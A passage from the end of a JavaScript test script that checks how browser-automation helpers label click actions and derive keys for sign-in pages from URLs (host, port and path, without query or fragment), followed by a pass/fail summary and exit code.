t('9: newlines in a text collapse into one line', actionLine('browser_click', { text: 'Sign\n  in' }, ex) === 'Click "Sign in" on example.com');
t('9: a sign-in page is remembered by site and path, the query left out', signInPageKey('https://example.com/login?next=/a') === 'example.com/login' && signInPageKey('https://example.com/login?next=/b') === 'example.com/login' && signInPageKey('https://example.com/signup') === 'example.com/signup' && signInPageKey('http://shop.example:8080/pay#x') === 'shop.example:8080/pay');
t('9: … another subdomain is another page; no site, no key', signInPageKey('https://www.example.com/login') === 'www.example.com/login' && signInPageKey('about:blank') === null && signInPageKey('file:///Users/ada/a.html') === 'file:/Users/ada/a.html');

console.log(failures ? `\n${failures} of ${checks} checks FAILED` : `\nALL OK (${checks} checks)`);
process.exit(failures ? 1 : 0);
